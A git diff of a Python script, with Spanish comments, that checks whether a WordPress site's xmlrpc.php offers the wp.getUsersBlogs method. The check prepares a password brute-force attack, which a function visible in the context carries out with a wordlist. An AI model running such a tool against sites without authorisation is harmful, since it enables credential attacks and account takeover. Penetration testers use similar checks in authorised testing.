@@ -6,6 +6,7 @@ import sys
 import argparse
 import os
 import requests
+import re
 
 
 # Ctrl_c
@@ -38,10 +39,28 @@ def XMLrpc_ffuf(url):
     """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
     url = url+'/xmlrpc.php'
     if os.path.exists("request.xml"):
-        with open("request.xml", "rb") as xml_request:
-            file = {"Request": xml_request}
-            response = requests.post(url, files=file)
-            print(colored(response.text, "red"))
+        with open("request.xml", "r") as xml_request:
+            data = xml_request.read()
+            raw_response = requests.post(url, data=data)
+            response = raw_response.text
+            regex = r"wp.{4}+[U].*[B].*s\b"
+            if re.findall(regex, response):
+                print(
+                    colored(f"\n[+] Se ha encontrado el método {re.findall(regex, response)}\n", "green"))
+            else:
+                print(
+                    colored("\n[!] No es posible hacer bruteforcing...", "red"))
+                sys.exit(1)
+    else:
+        with open("request.xml", "w") as create_xml_request:
+            create_xml_request.write("""
+            <?xml version="1.0" encoding="utf-8"?>
+            <methodCall>
+            <methodName>system.listMethods</methodName>
+            <params></params>
+            </methodCall>
+            """)
+            XMLrpc_ffuf(url)
 
 
 def XMLbrute_force(url, name, wordlist):
